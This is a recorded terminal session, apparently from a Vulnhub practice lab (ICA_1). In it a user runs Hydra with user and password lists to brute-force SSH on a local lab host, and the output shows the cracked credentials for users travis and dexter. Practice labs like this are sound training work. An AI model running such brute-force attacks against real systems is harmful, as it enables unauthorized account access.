@@ -1,0 +1,107 @@
+Script started on 2024-01-03 00:11:18+02:00 [TERM="xterm-256color" TTY="/dev/pts/1" COLUMNS="173" LINES="35"]
+]0;export NVM_DIR="$HOME/.nvm" - Parrot Terminal]0;[ -s "$NVM_DIR/nvm.sh" ] - Parrot Terminal]0;\. "$NVM_DIR/nvm.sh" - Parrot Terminal]0;[ -s "$NVM_DIR/bash_completion" ] - Parrot Terminal]0;\. "$NVM_DIR/bash_completion" - Parrot Terminal]0;[ -x /usr/bin/dircolors ] - Parrot Terminal]0;test -r ~/.dircolors - Parrot Terminal]0;eval "$(dircolors -b)" - Parrot Terminal]0;LS_COLORS='rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=00:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.avif=01;35:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.webp=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:*~=00;90:*#=00;90:*.bak=00;90:*.old=00;90:*.orig=00;90:*.part=00;90:*.rej=00;90:*.swp=00;90:*.tmp=00;90:*.dpkg-dist=00;90:*.dpkg-old=00;90:*.ucf-dist=00;90:*.ucf-new=00;90:*.ucf-old=00;90:*.rpmnew=00;90:*.rpmorig=00;90:*.rpmsave=00;90:' - Parrot Terminal]0;export LS_COLORS - Parrot Terminal]0;alias ls='ls --color=auto -v' - Parrot Terminal]0;alias dir='dir --color=auto' - Parrot Terminal]0;alias vdir='vdir --color=auto' - Parrot Terminal]0;alias grep='grep --color=auto' - Parrot Terminal]0;alias fgrep='fgrep --color=auto' - Parrot Terminal]0;alias egrep='egrep --color=auto' - Parrot Terminal]0;alias ll='ls -lh ' - Parrot Terminal]0;alias la='ls -lha' - Parrot Terminal]0;alias l='ls -CF' - Parrot Terminal]0;alias em='emacs -nw' - Parrot Terminal]0;alias _='sudo' - Parrot Terminal]0;alias _i='sudo -i' - Parrot Terminal]0;export OBSIDIANVAULT=/home/figaro/Documents/Obsidian\ Vault/ - Parrot Terminal]0;[ -f ~/.bash_aliases ] - Parrot Terminal]0;. ~/.bash_aliases - Parrot Terminal]0;[ -f ~/.bash_profile ] - Parrot Terminal]0;. ~/.bash_profile - Parrot Terminal]0;export GPROJ=/home/figaro/Programms/Github_Projects/NikolasProjects - Parrot Terminal]0;for f in /home/figaro/Programms/Bash/utilities/* - Parrot Terminal]0;source $f - Parrot Terminal]0;for f in /home/figaro/Programms/Bash/utilities/* - Parrot Terminal]0;source $f - Parrot Terminal]0;for f in /home/figaro/Programms/Bash/utilities/* - Parrot Terminal]0;source $f - Parrot Terminal]0;for f in /home/figaro/Programms/Bash/utilities/* - Parrot Terminal]0;source $f - Parrot Terminal]0;for f in /home/figaro/Programms/Bash/utilities/* - Parrot Terminal]0;source $f - Parrot Terminal]0;for f in /home/figaro/Programms/Bash/utilities/* - Parrot Terminal]0;source $f - Parrot Terminal]0;for f in /home/figaro/Programms/Bash/utilities/* - Parrot Terminal]0;source $f - Parrot Terminal]0;for f in /home/figaro/Programms/Bash/utilities/* - Parrot Terminal]0;source $f - Parrot Terminal]0;shopt -oq posix - Parrot Terminal]0;[ -f /usr/share/bash-completion/bash_completion ] - Parrot Terminal]0;. /usr/share/bash-completion/bash_completion - Parrot Terminal[?2004h[0;31m┌─[[0;39mfigaro[01;33m@[01;96moracle[0;31m]─[[0;32m~/Hacking/Vulnhub/ICA_1[0;31m]
+[0;31m└──╼ [0m[01;33m$[0mexitssh travis@$ipt[C[C[C[C[C[C[3Pgall update [C[C[C[C[C[Cssh travis@$ipt[C[C[C[C[C[Cexit[K[Kexitssh travis@$ipt[C[C[C[C[C[C[3Pgall update [C[C[C[C[C[Ccd Documents/obsidianVault[C[C[C[C[C[C[14Pgall update [C[C[C[C[C[Cssh travis@$ipt[C[C[C[C[C[C[3Pgall update [C[C[C[C[C[Ccd Documents/obsidianVault[C[C[C[C[C[C[C[C[C[Kexithydra -L files/users.txt -P files/passwords.txt ssh://$ipt[C[C[C[C[C[Cexit[Khydra -L files/users.txt -P files/passwords.txt ssh://$ipt[7mhydra -L files/users.txt -P files/passwords.txt $ipt ssh [27m^C[?2004l[?2004h[?2004l
+[?2004h[0;31m┌─[[0;31m✗[0;37m]─[[0;39mfigaro[01;33m@[01;96moracle[0;31m]─[[0;32m~/Hacking/Vulnhub/ICA_1[0;31m]
+[0;31m└──╼ [0m[01;33m$[0m[7mhydra -L files/users.txt -P files/passwords.txt $ipt ssh [27m[C[C[C[C[C[Chydra -L files/users.txt -P files/passwords.txt $ipt ssh 
+[?2004l]0;hydra -L files/users.txt -P files/passwords.txt $ipt ssh - Parrot TerminalHydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-01-03 00:11:38
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 50 login tries (l:10/p:5), ~4 tries per task
+[DATA] attacking ssh://192.168.1.9:22/
+[[1;32m22[0m][[1;32mssh[0m] host: [1;32m192.168.1.9[0m   login: [1;32mtravis[0m   password: [1;32mDJceVy98W28Y7wLg[0m
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-01-03 00:11:53
+[?2004h[0;31m┌─[[0;39mfigaro[01;33m@[01;96moracle[0;31m]─[[0;32m~/Hacking/Vulnhub/ICA_1[0;31m]
+[0;31m└──╼ [0m[01;33m$[0mhydra -L files/users.txt -P files/passwords.txt $ipt ssh 
+[?2004l]0;hydra -L files/users.txt -P files/passwords.txt $ipt ssh - Parrot TerminalHydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-01-03 00:11:56
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 50 login tries (l:10/p:5), ~4 tries per task
+[DATA] attacking ssh://192.168.1.9:22/
+[[1;32m22[0m][[1;32mssh[0m] host: [1;32m192.168.1.9[0m   login: [1;32mtravis[0m   password: [1;32mDJceVy98W28Y7wLg[0m
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-01-03 00:12:07
+[?2004h[0;31m┌─[[0;39mfigaro[01;33m@[01;96moracle[0;31m]─[[0;32m~/Hacking/Vulnhub/ICA_1[0;31m]
+[0;31m└──╼ [0m[01;33m$[0mhydra -L files/users.txt -P files/passwords.txt $ipt ssh 
+[?2004l]0;hydra -L files/users.txt -P files/passwords.txt $ipt ssh - Parrot TerminalHydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-01-03 00:12:11
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 50 login tries (l:10/p:5), ~4 tries per task
+[DATA] attacking ssh://192.168.1.9:22/
+[[1;32m22[0m][[1;32mssh[0m] host: [1;32m192.168.1.9[0m   login: [1;32mdexter[0m   password: [1;32m7ZwV4qtg42cmUXGX[0m
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-01-03 00:12:24
+[?2004h[0;31m┌─[[0;39mfigaro[01;33m@[01;96moracle[0;31m]─[[0;32m~/Hacking/Vulnhub/ICA_1[0;31m]
+[0;31m└──╼ [0m[01;33m$[0mhydra -L files/users.txt -P files/passwords.txt $ipt ssh -v
+[?2004l]0;hydra -L files/users.txt -P files/passwords.txt $ipt ssh -v - Parrot TerminalHydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-01-03 00:12:27
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 50 login tries (l:10/p:5), ~4 tries per task
+[DATA] attacking ssh://192.168.1.9:22/
+[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
+[INFO] Testing if password authentication is supported by ssh://Smith@192.168.1.9:22
+[INFO] Successful, password authentication is supported by ssh://192.168.1.9:22
+[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
+[ERROR] ssh protocol error
+[ERROR] could not connect to target port 22: Socket error: disconnected
+[ERROR] ssh protocol error
+[VERBOSE] Disabled child 8 because of too many errors
+[VERBOSE] Disabled child 14 because of too many errors
+[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
+[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
+[ERROR] ssh protocol error
+[ERROR] ssh protocol error
+[VERBOSE] Retrying connection for child 1
+[VERBOSE] Retrying connection for child 3
+[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
+[ERROR] ssh protocol error
+[VERBOSE] Retrying connection for child 10
+[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
+[ERROR] ssh protocol error
+[VERBOSE] Retrying connection for child 10
+[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
+[ERROR] ssh protocol error
+[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
+[ERROR] ssh protocol error
+[VERBOSE] Retrying connection for child 7
+[VERBOSE] Retrying connection for child 9
+[ERROR] could not connect to target port 22: Socket error: disconnected
+[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
+[ERROR] ssh protocol error
+[ERROR] ssh protocol error
+[VERBOSE] Retrying connection for child 7
+[VERBOSE] Retrying connection for child 9
+[[1;32m22[0m][[1;32mssh[0m] host: [1;32m192.168.1.9[0m   login: [1;32mdexter[0m   password: [1;32m7ZwV4qtg42cmUXGX[0m
+[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
+[ERROR] ssh protocol error
+[VERBOSE] Retrying connection for child 13
+[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
+[ERROR] ssh protocol error
+[VERBOSE] Retrying connection for child 12
+[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
+[ERROR] ssh protocol error
+[VERBOSE] Retrying connection for child 11
+[STATUS] attack finished for 192.168.1.9 (waiting for children to complete tests)
+^[[A^[[B1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-01-03 00:12:40
+[?2004h[0;31m┌─[[0;39mfigaro[01;33m@[01;96moracle[0;31m]─[[0;32m~/Hacking/Vulnhub/ICA_1[0;31m]
+[0;31m└──╼ [0m[01;33m$[0mhydra -L files/users.txt -P files/passwords.txt $ipt ssh -v[C[C[C[C[C[C[Khydra -L files/users.txt -P files/passwords.txt $ipt ssh -v[K[K
+[?2004l]0;hydra -L files/users.txt -P files/passwords.txt $ipt ssh - Parrot TerminalHydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-01-03 00:12:42
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 50 login tries (l:10/p:5), ~4 tries per task
+[DATA] attacking ssh://192.168.1.9:22/
+[[1;32m22[0m][[1;32mssh[0m] host: [1;32m192.168.1.9[0m   login: [1;32mtravis[0m   password: [1;32mDJceVy98W28Y7wLg[0m
+[[1;32m22[0m][[1;32mssh[0m] host: [1;32m192.168.1.9[0m   login: [1;32mdexter[0m   password: [1;32m7ZwV4qtg42cmUXGX[0m
+1 of 1 target successfully completed, 2 valid passwords found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-01-03 00:12:58
+[?2004h[0;31m┌─[[0;39mfigaro[01;33m@[01;96moracle[0;31m]─[[0;32m~/Hacking/Vulnhub/ICA_1[0;31m]
+[0;31m└──╼ [0m[01;33m$[0mεχιτ[K[K[K[Kexit
+[?2004l]0;exit - Parrot Terminalexit
+
+Script done on 2024-01-03 00:13:17+02:00 [COMMAND_EXIT_CODE="0"]
